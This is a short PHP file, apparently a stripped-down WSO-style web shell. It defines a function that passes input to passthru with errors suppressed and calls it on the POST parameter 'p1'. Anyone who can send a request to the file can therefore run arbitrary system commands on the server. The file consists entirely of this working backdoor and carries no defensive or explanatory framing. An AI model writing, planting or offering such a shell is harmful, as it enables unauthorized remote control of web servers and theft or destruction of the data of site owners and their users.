<?php
function wsoEx($in) {
    $out = '';
    if (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    }
    return $out;
}

wsoEx($_POST['p1']);
?>